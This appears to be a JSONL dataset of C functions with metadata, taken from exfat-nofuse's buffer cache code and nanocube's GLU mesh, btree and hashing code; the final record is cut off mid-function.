{"docstring": "/* end of FAT_cache_insert_hash */\n", "func_signal": "static void FAT_cache_remove_hash(BUF_CACHE_T *bp)", "code": "{\n\t(bp->hash_prev)->hash_next = bp->hash_next;\n\t(bp->hash_next)->hash_prev = bp->hash_prev;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_modify */\n", "func_signal": "void FAT_release_all(struct super_block *sb)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tsm_P(&f_sem);\n\n\tbp = p_fs->FAT_cache_lru_list.next;\n\twhile (bp != &p_fs->FAT_cache_lru_list) {\n\t\tif (bp->drv == p_fs->drv) {\n\t\t\tbp->drv = -1;\n\t\t\tbp->sec = ~0;\n\t\t\tbp->flag = 0;\n\n\t\t\tif (bp->buf_bh) {\n\t\t\t\t__brelse(bp->buf_bh);\n\t\t\t\tbp->buf_bh = NULL;\n\t\t\t}\n\t\t}\n\t\tbp = bp->next;\n\t}\n\n\tsm_V(&f_sem);\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_cache_get */\n", "func_signal": "static void FAT_cache_insert_hash(struct super_block *sb, BUF_CACHE_T *bp)", "code": "{\n\ts32 off;\n\tBUF_CACHE_T *hp;\n\tFS_INFO_T *p_fs;\n\n\tp_fs = &(EXFAT_SB(sb)->fs_info);\n\toff = (bp->sec + (bp->sec >> p_fs->sectors_per_clu_bits)) & (FAT_CACHE_HASH_SIZE-1);\n\n\thp = &(p_fs->FAT_cache_hash_list[off]);\n\tbp->hash_next = hp->hash_next;\n\tbp->hash_prev = hp;\n\thp->hash_next->hash_prev = bp;\n\thp->hash_next = bp;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_release */\n", "func_signal": "void buf_release_all(struct super_block *sb)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tsm_P(&b_sem);\n\n\tbp = p_fs->buf_cache_lru_list.next;\n\twhile (bp != &p_fs->buf_cache_lru_list) {\n\t\tif (bp->drv == p_fs->drv) {\n\t\t\tbp->drv = -1;\n\t\t\tbp->sec = ~0;\n\t\t\tbp->flag = 0;\n\n\t\t\tif (bp->buf_bh) {\n\t\t\t\t__brelse(bp->buf_bh);\n\t\t\t\tbp->buf_bh = NULL;\n\t\t\t}\n\t\t}\n\t\tbp = bp->next;\n\t}\n\n\tsm_V(&b_sem);\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_cache_get */\n", "func_signal": "static void buf_cache_insert_hash(struct super_block *sb, BUF_CACHE_T *bp)", "code": "{\n\ts32 off;\n\tBUF_CACHE_T *hp;\n\tFS_INFO_T *p_fs;\n\n\tp_fs = &(EXFAT_SB(sb)->fs_info);\n\toff = (bp->sec + (bp->sec >> p_fs->sectors_per_clu_bits)) & (BUF_CACHE_HASH_SIZE-1);\n\n\thp = &(p_fs->buf_cache_hash_list[off]);\n\tbp->hash_next = hp->hash_next;\n\tbp->hash_prev = hp;\n\thp->hash_next->hash_prev = bp;\n\thp->hash_next = bp;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_cache_insert_hash */\n", "func_signal": "static void buf_cache_remove_hash(BUF_CACHE_T *bp)", "code": "{\n\t(bp->hash_prev)->hash_next = bp->hash_next;\n\t(bp->hash_next)->hash_prev = bp->hash_prev;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_getblk */\n", "func_signal": "static u8 *__buf_getblk(struct super_block *sb, sector_t sec)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tbp = buf_cache_find(sb, sec);\n\tif (bp != NULL) {\n\t\tmove_to_mru(bp, &p_fs->buf_cache_lru_list);\n\t\treturn bp->buf_bh->b_data;\n\t}\n\n\tbp = buf_cache_get(sb, sec);\n\n\tbuf_cache_remove_hash(bp);\n\n\tbp->drv = p_fs->drv;\n\tbp->sec = sec;\n\tbp->flag = 0;\n\n\tbuf_cache_insert_hash(sb, bp);\n\n\tif (sector_read(sb, sec, &(bp->buf_bh), 1) != FFS_SUCCESS) {\n\t\tbuf_cache_remove_hash(bp);\n\t\tbp->drv = -1;\n\t\tbp->sec = ~0;\n\t\tbp->flag = 0;\n\t\tbp->buf_bh = NULL;\n\n\t\tmove_to_lru(bp, &p_fs->buf_cache_lru_list);\n\t\treturn NULL;\n\t}\n\n\treturn bp->buf_bh->b_data;\n\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* in : sb, loc\n  * out: content\n  * returns 0 on success\n  *            -1 on error\n  */\n", "func_signal": "s32 FAT_read(struct super_block *sb, u32 loc, u32 *content)", "code": "{\n\ts32 ret;\n\n\tsm_P(&f_sem);\n\n\tret = __FAT_read(sb, loc, content);\n\n\tsm_V(&f_sem);\n\n\treturn ret;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_cache_find */\n", "func_signal": "static BUF_CACHE_T *buf_cache_get(struct super_block *sb, sector_t sec)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tbp = p_fs->buf_cache_lru_list.prev;\n\twhile (bp->flag & LOCKBIT)\n\t\tbp = bp->prev;\n\n\n\tmove_to_mru(bp, &p_fs->buf_cache_lru_list);\n\treturn bp;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_sync */\n", "func_signal": "static BUF_CACHE_T *FAT_cache_find(struct super_block *sb, sector_t sec)", "code": "{\n\ts32 off;\n\tBUF_CACHE_T *bp, *hp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\toff = (sec + (sec >> p_fs->sectors_per_clu_bits)) & (FAT_CACHE_HASH_SIZE - 1);\n\n\thp = &(p_fs->FAT_cache_hash_list[off]);\n\tfor (bp = hp->hash_next; bp != hp; bp = bp->hash_next) {\n\t\tif ((bp->drv == p_fs->drv) && (bp->sec == sec)) {\n\n\t\t\tWARN(!bp->buf_bh, \"[EXFAT] FAT_cache has no bh. \"\n\t\t\t\t\t  \"It will make system panic.\\n\");\n\n\t\t\ttouch_buffer(bp->buf_bh);\n\t\t\treturn bp;\n\t\t}\n\t}\n\treturn NULL;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_sync */\n", "func_signal": "static BUF_CACHE_T *buf_cache_find(struct super_block *sb, sector_t sec)", "code": "{\n\ts32 off;\n\tBUF_CACHE_T *bp, *hp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\toff = (sec + (sec >> p_fs->sectors_per_clu_bits)) & (BUF_CACHE_HASH_SIZE - 1);\n\n\thp = &(p_fs->buf_cache_hash_list[off]);\n\tfor (bp = hp->hash_next; bp != hp; bp = bp->hash_next) {\n\t\tif ((bp->drv == p_fs->drv) && (bp->sec == sec)) {\n\t\t\ttouch_buffer(bp->buf_bh);\n\t\t\treturn bp;\n\t\t}\n\t}\n\treturn NULL;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of __FAT_write */\n", "func_signal": "u8 *FAT_getblk(struct super_block *sb, sector_t sec)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tbp = FAT_cache_find(sb, sec);\n\tif (bp != NULL) {\n\t\tmove_to_mru(bp, &p_fs->FAT_cache_lru_list);\n\t\treturn bp->buf_bh->b_data;\n\t}\n\n\tbp = FAT_cache_get(sb, sec);\n\n\tFAT_cache_remove_hash(bp);\n\n\tbp->drv = p_fs->drv;\n\tbp->sec = sec;\n\tbp->flag = 0;\n\n\tFAT_cache_insert_hash(sb, bp);\n\n\tif (sector_read(sb, sec, &(bp->buf_bh), 1) != FFS_SUCCESS) {\n\t\tFAT_cache_remove_hash(bp);\n\t\tbp->drv = -1;\n\t\tbp->sec = ~0;\n\t\tbp->flag = 0;\n\t\tbp->buf_bh = NULL;\n\n\t\tmove_to_lru(bp, &p_fs->FAT_cache_lru_list);\n\t\treturn NULL;\n\t}\n\n\treturn bp->buf_bh->b_data;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_read */\n", "func_signal": "s32 FAT_write(struct super_block *sb, u32 loc, u32 content)", "code": "{\n\ts32 ret;\n\n\tsm_P(&f_sem);\n\n\tret = __FAT_write(sb, loc, content);\n\n\tsm_V(&f_sem);\n\n\treturn ret;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_cache_move_to_mru */\n", "func_signal": "static void move_to_lru(BUF_CACHE_T *bp, BUF_CACHE_T *list)", "code": "{\n\tbp->prev->next = bp->next;\n\tbp->next->prev = bp->prev;\n\tpush_to_lru(bp, list);\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_release_all */\n", "func_signal": "void FAT_sync(struct super_block *sb)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tsm_P(&f_sem);\n\n\tbp = p_fs->FAT_cache_lru_list.next;\n\twhile (bp != &p_fs->FAT_cache_lru_list) {\n\t\tif ((bp->drv == p_fs->drv) && (bp->flag & DIRTYBIT)) {\n\t\t\tsync_dirty_buffer(bp->buf_bh);\n\t\t\tbp->flag &= ~(DIRTYBIT);\n\t\t}\n\t\tbp = bp->next;\n\t}\n\n\tsm_V(&f_sem);\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/*======================================================================*/\n/*  Cache Initialization Functions                                      */\n/*======================================================================*/\n", "func_signal": "s32 buf_init(struct super_block *sb)", "code": "{\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tint i;\n\n\t/* LRU list */\n\tp_fs->FAT_cache_lru_list.next = p_fs->FAT_cache_lru_list.prev = &p_fs->FAT_cache_lru_list;\n\n\tfor (i = 0; i < FAT_CACHE_SIZE; i++) {\n\t\tp_fs->FAT_cache_array[i].drv = -1;\n\t\tp_fs->FAT_cache_array[i].sec = ~0;\n\t\tp_fs->FAT_cache_array[i].flag = 0;\n\t\tp_fs->FAT_cache_array[i].buf_bh = NULL;\n\t\tp_fs->FAT_cache_array[i].prev = p_fs->FAT_cache_array[i].next = NULL;\n\t\tpush_to_mru(&(p_fs->FAT_cache_array[i]), &p_fs->FAT_cache_lru_list);\n\t}\n\n\tp_fs->buf_cache_lru_list.next = p_fs->buf_cache_lru_list.prev = &p_fs->buf_cache_lru_list;\n\n\tfor (i = 0; i < BUF_CACHE_SIZE; i++) {\n\t\tp_fs->buf_cache_array[i].drv = -1;\n\t\tp_fs->buf_cache_array[i].sec = ~0;\n\t\tp_fs->buf_cache_array[i].flag = 0;\n\t\tp_fs->buf_cache_array[i].buf_bh = NULL;\n\t\tp_fs->buf_cache_array[i].prev = p_fs->buf_cache_array[i].next = NULL;\n\t\tpush_to_mru(&(p_fs->buf_cache_array[i]), &p_fs->buf_cache_lru_list);\n\t}\n\n\t/* HASH list */\n\tfor (i = 0; i < FAT_CACHE_HASH_SIZE; i++) {\n\t\tp_fs->FAT_cache_hash_list[i].drv = -1;\n\t\tp_fs->FAT_cache_hash_list[i].sec = ~0;\n\t\tp_fs->FAT_cache_hash_list[i].hash_next = p_fs->FAT_cache_hash_list[i].hash_prev = &(p_fs->FAT_cache_hash_list[i]);\n\t}\n\n\tfor (i = 0; i < FAT_CACHE_SIZE; i++)\n\t\tFAT_cache_insert_hash(sb, &(p_fs->FAT_cache_array[i]));\n\n\tfor (i = 0; i < BUF_CACHE_HASH_SIZE; i++) {\n\t\tp_fs->buf_cache_hash_list[i].drv = -1;\n\t\tp_fs->buf_cache_hash_list[i].sec = ~0;\n\t\tp_fs->buf_cache_hash_list[i].hash_next = p_fs->buf_cache_hash_list[i].hash_prev = &(p_fs->buf_cache_hash_list[i]);\n\t}\n\n\tfor (i = 0; i < BUF_CACHE_SIZE; i++)\n\t\tbuf_cache_insert_hash(sb, &(p_fs->buf_cache_array[i]));\n\n\treturn FFS_SUCCESS;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of FAT_cache_find */\n", "func_signal": "static BUF_CACHE_T *FAT_cache_get(struct super_block *sb, sector_t sec)", "code": "{\n\tBUF_CACHE_T *bp;\n\tFS_INFO_T *p_fs = &(EXFAT_SB(sb)->fs_info);\n\n\tbp = p_fs->FAT_cache_lru_list.prev;\n\n\n\tmove_to_mru(bp, &p_fs->FAT_cache_lru_list);\n\treturn bp;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* end of buf_modify */\n", "func_signal": "void buf_lock(struct super_block *sb, sector_t sec)", "code": "{\n\tBUF_CACHE_T *bp;\n\n\tsm_P(&b_sem);\n\n\tbp = buf_cache_find(sb, sec);\n\tif (likely(bp != NULL))\n\t\tbp->flag |= LOCKBIT;\n\n\tWARN(!bp, \"[EXFAT] failed to find buffer_cache(sector:%llu).\\n\",\n\t     (unsigned long long)sec);\n\n\tsm_V(&b_sem);\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/*======================================================================*/\n/*  Buffer Read/Write Functions                                         */\n/*======================================================================*/\n", "func_signal": "u8 *buf_getblk(struct super_block *sb, sector_t sec)", "code": "{\n\tu8 *buf;\n\n\tsm_P(&b_sem);\n\n\tbuf = __buf_getblk(sb, sec);\n\n\tsm_V(&b_sem);\n\n\treturn buf;\n}", "path": "exfat-nofuse/exfat_cache.c", "commit_date": "2016-12-18 00:00:00", "repo_name": "dorimanx/exfat-nofuse", "stars": 699, "license": "gpl-2.0", "language": "c", "size": 304}
{"docstring": "/* MakeFace( newFace, eOrig, fNext ) attaches a new face and makes it the left\n * face of all edges in the face loop to which eOrig belongs.  \"fNext\" gives\n * a place to insert the new face in the global face list.  We insert\n * the new face *before* fNext so that algorithms which walk the face\n * list will not see the newly created faces.\n */\n", "func_signal": "static void MakeFace( GLUface *newFace, GLUhalfEdge *eOrig, GLUface *fNext )", "code": "{\n  GLUhalfEdge *e;\n  GLUface *fPrev;\n  GLUface *fNew = newFace;\n\n  assert(fNew != NULL); \n\n  /* insert in circular doubly-linked list before fNext */\n  fPrev = fNext->prev;\n  fNew->prev = fPrev;\n  fPrev->next = fNew;\n  fNew->next = fNext;\n  fNext->prev = fNew;\n\n  fNew->anEdge = eOrig;\n  fNew->data = NULL;\n  fNew->trail = NULL;\n  fNew->marked = FALSE;\n\n  /* The new face is marked \"inside\" if the old one was.  This is a\n   * convenience for the common case where a face has been split in two.\n   */\n  fNew->inside = fNext->inside;\n\n  /* fix other edges on this face loop */\n  e = eOrig;\n  do {\n    e->Lface = fNew;\n    e = e->Lnext;\n  } while( e != eOrig );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshConnect( eOrg, eDst ) creates a new edge from eOrg->Dst\n * to eDst->Org, and returns the corresponding half-edge eNew.\n * If eOrg->Lface == eDst->Lface, this splits one loop into two,\n * and the newly created loop is eNew->Lface.  Otherwise, two disjoint\n * loops are merged into one, and the loop eDst->Lface is destroyed.\n *\n * If (eOrg == eDst), the new face will have only two edges.\n * If (eOrg->Lnext == eDst), the old face is reduced to a single edge.\n * If (eOrg->Lnext->Lnext == eDst), the old face is reduced to two edges.\n */\n", "func_signal": "GLUhalfEdge *__gl_meshConnect( GLUhalfEdge *eOrg, GLUhalfEdge *eDst )", "code": "{\n  GLUhalfEdge *eNewSym;\n  int joiningLoops = FALSE;  \n  GLUhalfEdge *eNew = MakeEdge( eOrg );\n  if (eNew == NULL) return NULL;\n\n  eNewSym = eNew->Sym;\n\n  if( eDst->Lface != eOrg->Lface ) {\n    /* We are connecting two disjoint loops -- destroy eDst->Lface */\n    joiningLoops = TRUE;\n    KillFace( eDst->Lface, eOrg->Lface );\n  }\n\n  /* Connect the new edge appropriately */\n  Splice( eNew, eOrg->Lnext );\n  Splice( eNewSym, eDst );\n\n  /* Set the vertex and face information */\n  eNew->Org = eOrg->Dst;\n  eNewSym->Org = eDst->Org;\n  eNew->Lface = eNewSym->Lface = eOrg->Lface;\n\n  /* Make sure the old face points to a valid half-edge */\n  eOrg->Lface->anEdge = eNewSym;\n\n  if( ! joiningLoops ) {\n    GLUface *newFace= allocFace();\n    if (newFace == NULL) return NULL;\n\n    /* We split one loop into two -- the new loop is eNew->Lface */\n    MakeFace( newFace, eNew, eOrg->Lface );\n  }\n  return eNew;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshSplitEdge( eOrg ) splits eOrg into two edges eOrg and eNew,\n * such that eNew == eOrg->Lnext.  The new vertex is eOrg->Dst == eNew->Org.\n * eOrg and eNew will have the same left face.\n */\n", "func_signal": "GLUhalfEdge *__gl_meshSplitEdge( GLUhalfEdge *eOrg )", "code": "{\n  GLUhalfEdge *eNew;\n  GLUhalfEdge *tempHalfEdge= __gl_meshAddEdgeVertex( eOrg );\n  if (tempHalfEdge == NULL) return NULL;\n\n  eNew = tempHalfEdge->Sym;\n\n  /* Disconnect eOrg from eOrg->Dst and connect it to eNew->Org */\n  Splice( eOrg->Sym, eOrg->Sym->Oprev );\n  Splice( eOrg->Sym, eNew );\n\n  /* Set the vertex and face information */\n  eOrg->Dst = eNew->Org;\n  eNew->Dst->anEdge = eNew->Sym;\t/* may have pointed to eOrg->Sym */\n  eNew->Rface = eOrg->Rface;\n  eNew->winding = eOrg->winding;\t/* copy old winding information */\n  eNew->Sym->winding = eOrg->Sym->winding;\n\n  return eNew;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* Splice( a, b ) is best described by the Guibas/Stolfi paper or the\n * CS348a notes (see mesh.h).  Basically it modifies the mesh so that\n * a->Onext and b->Onext are exchanged.  This can have various effects\n * depending on whether a and b belong to different face or vertex rings.\n * For more explanation see __gl_meshSplice() below.\n */\n", "func_signal": "static void Splice( GLUhalfEdge *a, GLUhalfEdge *b )", "code": "{\n  GLUhalfEdge *aOnext = a->Onext;\n  GLUhalfEdge *bOnext = b->Onext;\n\n  aOnext->Sym->Lnext = b;\n  bOnext->Sym->Lnext = a;\n  a->Onext = bOnext;\n  b->Onext = aOnext;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshAddEdgeVertex( eOrg ) creates a new edge eNew such that\n * eNew == eOrg->Lnext, and eNew->Dst is a newly created vertex.\n * eOrg and eNew will have the same left face.\n */\n", "func_signal": "GLUhalfEdge *__gl_meshAddEdgeVertex( GLUhalfEdge *eOrg )", "code": "{\n  GLUhalfEdge *eNewSym;\n  GLUhalfEdge *eNew = MakeEdge( eOrg );\n  if (eNew == NULL) return NULL;\n\n  eNewSym = eNew->Sym;\n\n  /* Connect the new edge appropriately */\n  Splice( eNew, eOrg->Lnext );\n\n  /* Set the vertex and face information */\n  eNew->Org = eOrg->Dst;\n  {\n    GLUvertex *newVertex= allocVertex();\n    if (newVertex == NULL) return NULL;\n\n    MakeVertex( newVertex, eNewSym, eNew->Org );\n  }\n  eNew->Lface = eNewSym->Lface = eOrg->Lface;\n\n  return eNew;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshDeleteMesh( mesh ) will free all storage for any valid mesh.\n */\n", "func_signal": "void __gl_meshDeleteMesh( GLUmesh *mesh )", "code": "{\n  GLUface *fHead = &mesh->fHead;\n\n  while( fHead->next != fHead ) {\n    __gl_meshZapFace( fHead->next );\n  }\n  assert( mesh->vHead.next == &mesh->vHead );\n\n  memFree( mesh );\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshMakeEdge creates one edge, two vertices, and a loop (face).\n * The loop consists of the two new half-edges.\n */\n", "func_signal": "GLUhalfEdge *__gl_meshMakeEdge( GLUmesh *mesh )", "code": "{\n  GLUvertex *newVertex1= allocVertex();\n  GLUvertex *newVertex2= allocVertex();\n  GLUface *newFace= allocFace();\n  GLUhalfEdge *e;\n\n  /* if any one is null then all get freed */\n  if (newVertex1 == NULL || newVertex2 == NULL || newFace == NULL) {\n     if (newVertex1 != NULL) memFree(newVertex1);\n     if (newVertex2 != NULL) memFree(newVertex2);\n     if (newFace != NULL) memFree(newFace);     \n     return NULL;\n  } \n\n  e = MakeEdge( &mesh->eHead );\n  if (e == NULL) {\n     memFree(newVertex1);\n     memFree(newVertex2);\n     memFree(newFace);\n     return NULL;\n  }\n\n  MakeVertex( newVertex1, e, &mesh->vHead );\n  MakeVertex( newVertex2, e->Sym, &mesh->vHead );\n  MakeFace( newFace, e, &mesh->fHead );\n  return e;\n}", "path": "nanocube/src/polycover/glu/mesh.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//------------------------------------------------------------------------------\n// bt_Iter\n//------------------------------------------------------------------------------\n", "func_signal": "internal void\nbt_Iter_init(bt_Iter *self, bt_BTree *tree)", "code": "{\n\tbt_Node* node = bt_Ptr_Node_get(&tree->root);\n\tif (node) {\n\t\tself->stack_size = 1;\n\t\tbt_IterItem *item = &self->stack[0];\n\t\titem->node  =  node;\n\t\titem->depth =  0;\n\t\titem->node_index = 0;\n\t\titem->index =  0;\n\t\titem->first =  1;\n\t\titem->kv    =  0;\n\t} else {\n\t\tself->stack_size = 0;\n\t}\n}", "path": "nanocube/src/nanocube/nanocube_btree.c", "commit_date": "2018-07-24 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//\n// returns non-negative number corresponding\n// to an existing entry with the same hash\n//\n// return -1-(insertion index) if key not found\n// eg.\n//     -1 if new entry should be inserted at position index 0\n//     -2 if new entry should be inserted at position index 1\n//     ...\n//     -k if new entry should be inserted at position index k-1\n//\n", "func_signal": "internal s64\nbt_Node_hash_insert_index(bt_Node* self, bt_Hash hash)", "code": "{\n\tAssert(self->num_entries <= bt_MAX_ENTRIES);\n\n\t// [l,r)\n\tbt_Hash *l = self->hashes;\n\tbt_Hash *r = self->hashes + self->num_entries;\n\n\tif (l == r) return -1;\n\n\t/* make sure l and r are always changing */\n\twhile (r - l > 2) {\n\t\t/* m and m+1 are both different from l and r */\n\t\tbt_Hash *m = l + (r-l)/2;\n\t\tif (hash <= *m) {\n\t\t\tr = m+1;\n\t\t} else {\n\t\t\tl = m;\n\t\t}\n\t}\n\n\tif (r - l == 2) {\n\t\tif (hash < *l) {\n\t\t\treturn -1 - (l - self->hashes);\n\t\t} else if (hash == *l) {\n\t\t\treturn l - self->hashes;\n\t\t} else if (hash < *(l + 1)) {\n\t\t\treturn -1 - (l + 1 - self->hashes);\n\t\t} else if (hash == *(l + 1)) {\n\t\t\treturn (l + 1) - self->hashes; // this without parenthesis is weird\n\t\t} else {\n\t\t\treturn -1 - (r - self->hashes);\n\t\t}\n\t} else { /* r - l == 1 */\n\t\tif (hash < *l) {\n\t\t\treturn -1 - (l - self->hashes);\n\t\t} else if (hash == *l) {\n\t\t\treturn l - self->hashes;\n\t\t} else {\n\t\t\treturn -1 - (r - self->hashes);\n\t\t}\n\t}\n}", "path": "nanocube/src/nanocube/nanocube_btree.c", "commit_date": "2018-07-24 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "//\n// copied on Jan 17, 2017 from:\n//\n// https://github.com/wolkykim/qlibc/blob/master/src/utilities/qhash.c\n//\n", "func_signal": "u32 set_murmur3_32(const void *data, size_t nbytes)", "code": "{\n#if 0\n\treturn 1;\n#else\n\tif (data == NULL || nbytes == 0)\n\t\treturn 0;\n\n\tconst u32 c1 = 0xcc9e2d51;\n\tconst u32 c2 = 0x1b873593;\n\n\tconst int nblocks = nbytes / 4;\n\tconst u32 *blocks = (const u32 *) (data);\n\tconst u8 *tail = (const u8 *) (data + (nblocks * 4));\n\n\tu32 h = 0;\n\n\tint i;\n\tu32 k;\n\tfor (i = 0; i < nblocks; i++) {\n\t\tk = blocks[i];\n\n\t\tk *= c1;\n\t\tk = (k << 15) | (k >> (32 - 15));\n\t\tk *= c2;\n\n\t\th ^= k;\n\t\th = (h << 13) | (h >> (32 - 13));\n\t\th = (h * 5) + 0xe6546b64;\n\t}\n\n\tk = 0;\n\tswitch (nbytes & 3) {\n\tcase 3:\n\t\tk ^= tail[2] << 16;\n\tcase 2:\n\t\tk ^= tail[1] << 8;\n\tcase 1:\n\t\tk ^= tail[0];\n\t\tk *= c1;\n\t\tk = (k << 15) | (k >> (32 - 15));\n\t\tk *= c2;\n\t\th ^= k;\n\t};\n\n\th ^= nbytes;\n\n\th ^= h >> 16;\n\th *= 0x85ebca6b;\n\th ^= h >> 13;\n\th *= 0xc2b2ae35;\n\th ^= h >> 16;\n\n\treturn h;\n#endif\n}", "path": "nanocube/src/base/set.c", "commit_date": "2017-11-09 00:00:00", "repo_name": "laurolins/nanocube", "stars": 729, "license": "epl-1.0", "language": "c", "size": 44915}
{"docstring": "/* __gl_meshZapFace( fZap ) destroys a face and removes it from the\n * global face list.  All edges of fZap will have a NULL pointer as their\n * left face.  Any edges which also have a NULL pointer as their right face\n * are deleted entirely (along with any isolated vertices this produces).\n * An entire mesh can be deleted by zapping its faces, one at a time,\n * in any order.  Zapped faces cannot be used in further mesh operations!\n */\n", "func_signal": "void __gl_meshZapFace( GLUface *fZap )", "code": "{\n  GLUhalfEdge *eStart = fZap->anEdge;\n  GLUhalfEdge *e, *eNext, *eSym;\n  GLUface *fPrev, *fNext;\n\n  /* walk around face, deleting edges whose right face is also NULL */\n  eNext = eStart->Lnext;\n  do {\n    e = eNext;\n    eNext = e->Lnext;\n\n    e->Lface = NULL;\n    if( e->Rface == NULL ) {\n      /* delete the edge -- see __gl_MeshDelete above */\n\n      if( e->Onext == e ) {\n\tKillVertex( e->Org, NULL );\n      } else {\n\t/* Make sure that e->Org points to a valid half-edge */\n\te->Org->anEdge = e->Onext;\n\tSplice( e, e->Oprev );\n      }\n      eSym = e->Sym;\n      if( eSym->Onext == eSym ) {\n\tKillVertex( eSym->Org, NULL );\n      } else 